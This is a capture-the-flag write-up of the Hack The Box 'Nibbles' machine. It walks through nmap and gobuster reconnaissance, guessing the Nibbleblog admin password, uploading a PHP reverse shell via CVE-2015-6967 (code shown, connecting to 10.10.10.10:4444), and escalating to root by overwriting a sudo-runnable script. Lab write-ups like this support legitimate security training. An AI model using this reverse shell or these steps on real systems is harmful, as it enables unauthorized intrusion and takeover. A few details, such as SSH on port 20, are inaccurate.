## Nibbles

This was complete as part of HTB academy (but independently without looking at the walkthrought)




### Reconnaisance

We start by adding `nibbles` hostname to /etc/hosts file

We then execute a standard nmap scan - `sudo nmap -Pn -sC -sV -O -vv -p- -oN scans/nmap.scan nibbles`
- `-Pn` - does not probe host before attempting to scan target
- `-sC` - executes default basic nmap scripts
- `-sV` - performs versioning scripts on scanned services
- `-vv` - provides overly verbose scan information
- `-p-` - scans all 65535 TCP ports
- `-oN` - outputs scan results as a txt file of name `scans/nmap.scan`

The namp scan discovers two open public ports:
- 20 SSH
  - Service: OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
  - Seems that this version is somewhat outdated and may be susceptible to medium CVEs
- 80 HTTP
  - Service: Apache 2.4.18
  - Seems that this version is somewhat outdated and may be susceptible to medium CVE's

The scan's versioning and OS fingerprintings points to the host running a Ubuntu installation



#### Exploring the HTTP Service


The root php page `http://nibbles/` returns a "Hello World page"
- This webapp is likely a  in-development project or poorly-organized.
- Therefore, we need to search the website directory structure to find relevant resources
- Inspecting the webpage source contains a comment mentioning a directory called `/nibbleblog/`


Let's rule out that there is no other relevant folders in the top-level website directory 
- Executing `gobuster dir -u http://nibbles/ -w /usr/share/wordlists/dirb/big.txt -t 100 > scans/gobuster.toplevel`
  - `dir` - fuzz files and directories
  - `-u <url>` - fuzz on the following top-level directory (NOTE: Gobuster does not support recursive crawling)
  - `-w <file>` - use the file to fuzz the directory specified in above flag
  - `-t 100` - use 100 threads while fuzzing the webserver
  - `> scans/gobuster.toplevel` - stores the scan results into the file `scans/gobuster.toplevel`
- The results show no resources that we can access
  - `.htaccess` `.htpasswd` and `server-status` are files used by the webserver software 'Apache'
  - If you look at the scan, you can see that we are forbidden from accessing them since we receive a 403 HTTP Response


Let's take a look at the `http://nibbles/nibbleblog/` directory
- This contains an empty blog website with no content or resources
- A footer to this blog tells us that this blog site is "Powered by Nibbleblog"
- On further research, "Nibbleblog" is a php engine for creating blogs
- Therefore, we know that the website has a PHP dependency and Nibbleblog dependency
- If we can find the versions of this technologies used, we could see if there are any relevant CVE's


Let's fuzz this directory again using a similar goboster command
- Executing `gobuster dir -u http://nibbles/nibbleblog/ -w /usr/share/wordlists/dirb/big.txt -t 100 > scans/gobuster.blog`
- There are a few potentially interesting directory names that gobuster found:
  - /backups 
    - This could contain sensitive information on the system if it accidentally backedup files that are privileged and/or out-of-scope, and we are allowed to access it (301 -> 200)
    - However, upon inspection this is empty. Maybe a backup hasn't happened yet? Or the backup has been deleted and we might need to wait until the next one (or force a backup)?
    - We may come back to this later if we don't find any better route to a foothold elsewhere
  - /plugins
    - This is an interesting folder as we will likely be able to gauge dependency versions. Although plugins provide useufl add-on functionality provided by a base product, they are responsible for a large amount of CVE's
    - This provides a list of 15 plugins which contains language files and 
    - Within each plugin folder, there is typically versioning provided in the plugin.bit file
      - Is this the plugin-versions or the nibbleblog version?
  - /content/
    - This contains three folders `private/`, `public/`, and `tmp/`
    - The `tmp/` directory is empty
    - The `public/` directory has an empty skeleton directory structure
    - The `private/` directory is not "private" however. We are able to access and traverse its subdirectories
      - An interesting file found is:
        - `private/users.xml` which contains a single xml entry for a admin user:
          - username: admin
          - There is no password/email provided in this file
      - Another interesting file is:
        - `private/config.xml` which contains an email
          - email: admin@nibbles.com

  - /README
    - This tells us that Nibbleblog version 4.0.3 is being ran (2014)
      - This seems like a outdated version - there are CVE's that exist for it
    - This has a minimum of PHP version of 5.2
      - This is an oudated versions - there are many CVE's that exist for it
  - /admin.php
    - Provides access to a admin login portal for the nibbleblog management system
  - /admin/
    - 



###### Information Gathering Recap

We have found:
- A blog website whose dependencies are:
  - nibbleblog version 4.0.3
  - php >= 5.2
  - plugins (which can be found in `/content/private/plugins` and `/plugins` directories
- And has users:
  - username: admin, email: admin@nibbles.com, password: <UNKNOWN>

There's seems to be a shell upload vulnerability in nibbleblog version 4.0.3 according to CVE-2015-6967
- This is exactly what we need to gain a foothold on the webserver
- The pre-requisite is that we have admin access to the nibbleblog portal
  - However, we do not have a password
  - Since this is an empty blog, it is highly likely that this could have a default password

We could try using CeWL to generate a password and use Hydra to bruteforce the login

###### "Exploit" Pt 1.

After playing around with the admin portal and  attempting a few passwords, we got blacklisted for a few minutes.
- We need to find a way around this blacklisting!

I searched Google for any default passwords for nibbleblog, but instead received the password for this box (a little unforunate). Nevertheless, it was a password I was planning on trying before attempting to try a more sophisticated approach.

The admin portal creds are `admin:nibbles`

###### "Exploit" Pt 2.

Following the CVE that I found, I uploaded the following reverse shell named `expl.php` using the `my_image` plugin. This CVE mentioned that there is no validation of file extensions and these file extensions are maintaed after uploading. Therefore, we can upload the reverse shell and execute it by accessing the file  in the website's directory structure. Since we have access to what should be private folders, we'll likely be able to find the uploaded shell as publically accessible.

```
<?php

$lhost = "10.10.10.10";
$lport = 4444;

$sock = fsockopen($lhost, $lport);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);

?>

```

After uploading it, we setup a netcat listener at:
- `nc -lvnp 4444`

Following the CVE, we access the file at:
- `http://nibbles/nibbleblog/content/private/plugins/my_image/image.php`

This sets up a reverse shell!

#### User Flag

We can traverse to /home/nibbler/ to cat the user.txt file

#### Root Flag

On performing `sudo -l`, we see we can execute the script monitor.sh as root user which resides in the nibbler home directory under the `personal` subdirectory. Currently that does not exist (however, there is a `personal.zip` file we can unzip.

Unzipping the folder `unzip personal.zip` and traversing to the path found in `sudo -l`, we find this `monitor.sh` file.

Looking at its permissions, it seems we can modify it! We can setup a shell session as the root user!
- We execute `nc -lvnp 5555` on our local machine
- We replace the `monitor.sh` file on the target machine with a file also named `monitor.sh` containing:
  - echo "su -" > monitor.sh

Executing `id && whoami`:

uid=0(root) gid=0(root) groups=0(root)
root


We can then traverse to the `/root` directory and cat `root.txt` to obtain the root flag.



      






